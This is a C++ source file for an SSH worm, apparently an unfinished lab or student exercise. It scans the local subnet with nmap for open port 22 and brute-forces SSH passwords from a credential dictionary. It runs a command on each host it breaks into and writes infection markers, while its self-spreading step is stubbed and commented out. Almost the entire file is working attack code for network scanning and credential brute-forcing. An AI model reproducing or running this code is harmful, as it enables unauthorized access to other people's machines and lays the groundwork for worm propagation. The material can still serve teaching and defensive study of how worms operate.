/*******************************************************************************
 * Filename: replicator_worm.cpp
 * Description:  A simple SSH worm that will spread to one machine at a time
 * Required:  sudo apt-get install libssh-dev
 *            sudo apt-get install nmap  (if not already exists)
 ******************************************************************************/
#include "worm_support.h"
#include <sys/types.h>
#include <sys/wait.h>   // wait() system call
#include <sys/stat.h>
#include <stdio.h>
#include <unistd.h>     // fork() system call
#include <stdlib.h>     // exit() system call
#include <ifaddrs.h>    // To get the interface addresses
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <errno.h>
#include <string>
#include <vector>
#include <libssh/libssh.h>  // ssh library
#include <libssh/sftp.h>  // sftp module

/*******************************************************************************
 * Define sections
 ******************************************************************************/

/*******************************************************************************
 * Public variables
 ******************************************************************************/
using namespace std;

/*******************************************************************************
 * Function definitions
 ******************************************************************************/

/*******************************************************************************
 * Function: isFileExist
 * @param inFile string contain the name of the file to check
 * @return a boolean of true if exist or false if not
 ******************************************************************************/
bool isFileExist(const string inFile) {
    struct stat fileBuff;
    if ( stat(inFile.c_str(), &fileBuff) != 0) {
        return false;
    }
    return true;
}

/*******************************************************************************
 * Function: isRemoteFileExist
 * @param inFile string contain the name of the file to check
 * @param sshClient an active ssh session to a remote system
 * @return a boolean of true if exist or false if not
 ******************************************************************************/
bool isRemoteFileExist(ssh_session sshClient, const string inFile) {
    // TODO
    return true;
}

/*******************************************************************************
 * Function: isLocalSystemInfected
 * @param N/A
 * @return a boolean of true if infected or marked as master or false if not
 ******************************************************************************/
bool isLocalSystemInfected() {
    return ( isFileExist(SELF_MARKER_FILE) || isFileExist(INFECTED_MARKER_FILE));
}

/*******************************************************************************
 * Function: isRemoteSystemInfected
 * @param sshClient
 * @return a boolean of true if remote system infected or false if not
 ******************************************************************************/
bool isRemoteSystemInfected(ssh_session sshClient) {
    return (isRemoteFileExist(sshClient, SELF_MARKER_FILE) ||
            isRemoteFileExist(sshClient, INFECTED_MARKER_FILE));
}

/*******************************************************************************
 * Function: markSystem
 * @param inFile a string contain the file name
 * @param message a string contains the IP from where the attacker is
 * @return a boolean of true if remote system infected or false if not
 ******************************************************************************/
void markSystem(string inFile, string message) {
    string msg = message;

    // Open the file and write the message to it
    FILE* fp = fopen(inFile.c_str(), "w");
    if (!fp) {
        perror("markSystem: fopen failed\n");
        exit(-1);
    }
    // Write the message into it
    if (fwrite(msg.c_str(), sizeof(char), msg.length(), fp) < 0 ) {
        perror("markSystem: fwrite failed\n");
        exit(-1);
    }

    // Close the file
    fclose(fp);
}

/*******************************************************************************
 * Function: markSystemAsInfected
 * @param inFile a string contain the file name
 * @return a boolean of true if remote system infected or false if not
 ******************************************************************************/
void markSystemAsInfected(const string fromHost = "") {
    string msg = "";
    if (fromHost.length() > 0) {
        msg += "Infected from " + fromHost;
    } else {
        msg += "I got infected boo hooo";
    }
    // Mark the system
    markSystem(INFECTED_MARKER_FILE, msg);

}

/*******************************************************************************
 * Function: markSystemAsInfected
 * @param inFile a string contain the file name
 * @return a boolean of true if remote system infected or false if not
 ******************************************************************************/
void markSystemAsMaster() {
    string msg = "I am the master";
    // Mark the system
    markSystem(SELF_MARKER_FILE, msg);
}

/*******************************************************************************
 * Function: getCIDR
 * @param myIF a pointer to a Iface struct that contain the IP/NetMask
 * @return a string contain the CIDR format
 ******************************************************************************/
string getCIDR(unsigned int IP, unsigned int Mask) {
    string cidr;
    // We first masked the rawIP to get the network address and stored it in
    // in_addr format so that we can use inet_ntoa later
    in_addr networkIP;
    networkIP.s_addr = IP & Mask;

    // Find number of bits used by the network mask by shifting 1 bit
    // at a time until we reach zero.
    unsigned int count = 0;
    while (Mask > 0) {
        Mask = Mask >> 1;
        count++;
    }

    // Convert the count value to string
    char buff[10];
    sprintf(buff, "%u",count);

    // Build the CIDR string
    cidr = inet_ntoa(networkIP);
    cidr += "/";
    cidr += buff;

    return cidr;
}

/*******************************************************************************
 * Function: getMyActiveIP
 * @param N/A
 * @return a Iface struct that has the IP, Mask, and CIDR
 ******************************************************************************/
Iface getMyActiveIP() {
    Iface host;
    ifaddrs *ifAddresses, *ifa;

    // Retrieves all Internet Interfaces.  Create a link list of ifAddresses
    if (getifaddrs(&ifAddresses) < 0) {
        perror("getMyActiveIP failed getifaddrs\n");
        exit(-1);
    }

    // We will use the pointer ifa to iterate through the addresses
    ifa = ifAddresses;

    while (ifa) {
        // We do not want to deal with the "lo" name.
        if ( strcmp(ifa->ifa_name, "lo") != 0 ) {
            // We retrieve the address and the netmask into the struct
            // sockaddr_in (for IPV4)
            sockaddr_in *address = (sockaddr_in *) ifa->ifa_addr;
            sockaddr_in *netmask = (sockaddr_in *) ifa->ifa_netmask;

            if (address->sin_family == AF_INET) {
                // We get the ip and netmask
                host.ip = inet_ntoa(address->sin_addr);
                host.mask = inet_ntoa(netmask->sin_addr);

                // Call getCIDR to build CIDR from IP and NetMask
                host.cidr = getCIDR(address->sin_addr.s_addr, netmask->sin_addr.s_addr);
                break;
            }
        }

        // we advance to the next one
        ifa = ifa->ifa_next;
    }

    ifa = NULL;
    // Free the memory
    freeifaddrs(ifAddresses);

    // Return the host
    return host;

}

/*******************************************************************************
 * Function: getHostsOnTheSameNetwork
 * @param host A Iface struct contains information about the system
 8              such as ip, mask, cidr
 * @return a list of IP addresses of hosts that have SSH port open
 ******************************************************************************/
vector<string> getHostsOnTheSameNetwork(const Iface host) {

    string nmapFile = "/tmp/nmap.txt";

    // We will fork a child and use it to run nmap
    // Expected that the nmap program is available on the system
    pid_t pid = fork();

    if (pid < 0) {
        perror("getHostsOnTheSameNetwork failed to fork\n");
        exit(-1);
    } else if (pid == 0) {
        // I'm the child process
        printf("Scanning the network...\n");

        // We want to silence the output of nmap.
        // close both STDOUT and STDERR
        close(1);
        close(2);
        // Run nmap program against the CIDR string for:
        // port 22 with open status
        // output in greppable format in a file called /tmp/nmap.txt
        if (execlp("/usr/bin/nmap", "nmap", host.cidr.c_str(), "-p 22", "--open", "-oG", nmapFile.c_str(), NULL) < 0) {
            perror("getHostsOnTheSameNetwork: execlp failed child");
            exit(-1);
        };
        printf("Should not be possible to get to here !!!!");
        exit(-1);

    } else {
        // Parent process wait for child to complete
        wait(NULL);
        // Child return, we should have access to the file to process it
        vector<string> allHosts;

        if (isFileExist(nmapFile)) {

            // We need to parse the nmapFile
            FILE* fp = fopen(nmapFile.c_str(), "r");
            if (!fp) {
                perror("getHostsOnTheSameNetwork: Error open nmapfile\n");
                exit(-1);
            }

            // Now read through all the file content
            while( !feof(fp) ) {
                char buff[1024];
                // Read the data line by line
                if (fgets(buff, sizeof(buff), fp)) {

                    // We want to only get the line that say 22/open/tcp
                    // and is not the same IP as the host
                    if (strstr( buff, "22/open/tcp" ) &&
                        ! strstr( buff, host.ip.c_str() ) ) {
                        // Parse the string by space.  We ignore the first token
                        char *token = strtok(buff, " ");
                        // We want the 2nd token which is the IP
                        token = strtok(NULL, " ");

                        // Add the IP to the list
                        allHosts.push_back(token);
                    }
                }
            }
            return allHosts;
        } else {
            perror ("getHostsOnTheSameNetwork: nmap did not generated file!!!\n");
            exit(-1);
        }
    }
}

/*******************************************************************************
 * Function: sshVerifyKnownHost
 * The code was from the examples of libssh
 * @param sshClient is a ssh_session
 * @return 0 for success or -1 for fail
 ******************************************************************************/
int sshVerifyKnownHost(ssh_session sshClient) {
    // Successfully connect to server.  Accept connection
    // and write the knownhost file
    unsigned char *keyHash = NULL;
    bool goodHost = false;
    int state;

    // Get public key hash from the server
    if ( ssh_get_pubkey_hash(sshClient, &keyHash) < 0 ) {
        perror("Unable to get pubkey hash\n");
        return -1;
    }

    // Check known host
    state = ssh_is_server_known(sshClient);

    switch(state) {
        case SSH_SERVER_KNOWN_OK:
            printf("Server known OK \n");
            goodHost = true;
            break;
        case SSH_SERVER_KNOWN_CHANGED:
            printf("Server known changed \n");
            goodHost = false;
            break;
        case SSH_SERVER_FOUND_OTHER:
            printf("Server found other\n");
            goodHost = false;
            break;
        case SSH_SERVER_FILE_NOT_FOUND:
        case SSH_SERVER_NOT_KNOWN:
            printf("Writing file....");
            if (ssh_write_knownhost(sshClient) < 0) {
                printf("FAILED\n");
                goodHost = false;
            } else {
                printf("GOOD\n");
                goodHost = true;
            }
            break;
        case SSH_SERVER_ERROR:
            printf("Server Error %s \n", ssh_get_error(sshClient));
            goodHost = false;
    } // End switch state

    // Clear the hash value
    ssh_clean_pubkey_hash(&keyHash);
    if (goodHost) {
        return 0;
    } else {
        return 1;
    }
}

/*******************************************************************************
 * Function: tryCredential
 * @param sshClient a ssh_session
 * @param host a string contains the IP of the victim host
 * @param cred a Credential structs contains user/pass
 * @return 0 if good, -1 if failed
 ******************************************************************************/
int tryCredential(ssh_session &sshClient, const string host, const Credential cred) {

    // Initialize the sshClient
    //ssh_session sshClient;
    unsigned int port = 22;
    bool success = false;
    const char *user = cred.userName.c_str();
    const char *pass = cred.password.c_str();

    sshClient = ssh_new();
    if (sshClient == NULL) {
        perror("attackSystem: unable to initialize sshClient\n");
        return -1;
    }

    // Set the host
    if (ssh_options_set(sshClient, SSH_OPTIONS_HOST, host.c_str()) < 0) {
        perror("attackSystem: unable to set host\n");
        ssh_free(sshClient);
        return -1;
    }

    // Set the port
    if (ssh_options_set(sshClient, SSH_OPTIONS_PORT, &port) < 0) {
        perror("attackSystem: unable to set port\n");
        ssh_free(sshClient);
        return -1;
    }

    // Set the user
    if (ssh_options_set(sshClient, SSH_OPTIONS_USER, user) < 0) {
        perror("attackSystem: unable to set user\n");
        ssh_free(sshClient);
        return -1;
    }

    printf("Attacking host: %s with %s/%s...\n", host.c_str(), user, pass);

    // Connect to server
    if (ssh_connect(sshClient) != SSH_OK) {
        printf("Error connect to host %s\n", ssh_get_error(sshClient));
        ssh_disconnect(sshClient);
        ssh_free(sshClient);
        return -1;
    }

    // Check for known hosts
    if (sshVerifyKnownHost(sshClient) < 0) {
        perror("Failed verify known host\n");
        ssh_disconnect(sshClient);
        ssh_free(sshClient);
        return -1;
    }

    // Try to authenticate with password
    int ReturnCode = ssh_userauth_password(sshClient, NULL, pass);

    if (ReturnCode == SSH_AUTH_ERROR) {
        printf("attackSystem: Something wrong. %s\n", ssh_get_error(sshClient));
    } else if (ReturnCode == SSH_AUTH_DENIED) {
        printf("Invalid Credential.  Denied\n");
        success = false;
    } else if (ReturnCode == SSH_AUTH_SUCCESS) {
        printf("Good Credential. Logged In\n");
        success = true;
    }

    // See whether we have a success valid sshClient
    if (success) {
        return 0;
    } else {
        // We couldn't get a valid session.  Free it and return NULL
        ssh_disconnect(sshClient);
        ssh_free(sshClient);
        return -1;
    }

}

/*******************************************************************************
 * Function: attackSystem
 * @param host a string contains the IP of the victim host
 * @return a valid active ssh_session or NULL if not
 ******************************************************************************/
ssh_session attackSystem(const string host) {
    ssh_session sshClient;

    printf("Attacking host: %s ...\n", host.c_str());
    for (int i = 0; i < DICTIONARY_SIZE; i++) {
        Credential cred = DICTIONARY[i];
        if (tryCredential(sshClient, host, cred) == 0) {
            return sshClient;
        }
    }
    return NULL;
}

/*******************************************************************************
 * Function:
 * @param host a string contains the IP of the victim host
 * @return a valid active ssh_session or NULL if not
 ******************************************************************************/
int show_remote_files(ssh_session session) {
  ssh_channel channel;
  int rc;
  channel = ssh_channel_new(session);
  if (channel == NULL) return SSH_ERROR;
  rc = ssh_channel_open_session(channel);
  if (rc != SSH_OK)
  {
    ssh_channel_free(channel);
    return rc;
  }
  rc = ssh_channel_request_exec(channel, "ls -l");
  if (rc != SSH_OK)
  {
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    return rc;
  }

  char buffer[256];
  int nbytes;
  nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
  while (nbytes > 0)
  {
    if (fwrite(buffer, 1, nbytes, stdout) != nbytes)
    {
      ssh_channel_close(channel);
      ssh_channel_free(channel);
      return SSH_ERROR;
    }
    nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
  }
  if (nbytes < 0)
  {
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    return SSH_ERROR;
  }
  ssh_channel_send_eof(channel);
  ssh_channel_close(channel);
  ssh_channel_free(channel);
  return SSH_OK;
}
/*******************************************************************************
 * Main program
 * Program accept command line arguments
 ******************************************************************************/
int main (int argc, const char **argv) {
    Iface thisHost;
    vector<string> allHosts;

    // Check to see if run from master/hacker PC
    // argc start at 1 and going up
    if(argc < 2)
    {
        // If the Local System has not been mark as master, mark it
        if (! isLocalSystemInfected() ) {
            // Mark the system as master
            markSystemAsMaster();
        }
        printf("Running on the hacker system...\n");
    } else {
        printf("We are on the victim system ... let's do some damage \n");
        if ( isLocalSystemInfected() ) {
            // System already infected
            printf("System already infected.  Quit\n");
            exit(0);
        } else {
            string fromHost = argv[1];
            // Mark the system
            markSystemAsInfected(fromHost);
        }
    }

    // Get the IP address of this system
    thisHost = getMyActiveIP();

    // Get all the hosts from the network
    allHosts = getHostsOnTheSameNetwork(thisHost);

    printf("Host IP: %s Mask: %s CIDR: %s\n", thisHost.ip.c_str(),
                      thisHost.mask.c_str(), thisHost.cidr.c_str());
    printf("Found the following hosts:\n");
    for (int i = 0; i < allHosts.size(); i++) {
        printf("Host: %s\n", allHosts[i].c_str());
    }

    // Loop through to attack the system

    for (int i = 0; i < allHosts.size(); i++) {
        string host = allHosts[i];
        ssh_session sshClient;

        sshClient = attackSystem(host);

        if (sshClient == NULL) {
            printf("Unsuccessfully attack host %s.  Move to next one.\n", host.c_str());
            continue;
        }

        // If we get here, it means that we have a good sshClient
        // TODO

        // TODO: Get something done here with the session
        int rc = show_remote_files(sshClient);

        ssh_disconnect(sshClient);
        ssh_free(sshClient);
        // If the remote system is already infected skip
        //    continue;
        // Else we spread it
        // spreadAndExecute(sshSession, thisHost.ip);
        //    spread Done
        //    break;  // Since we only do 1 hop spread at a time
    }

    // All Done here
    return 0;

}
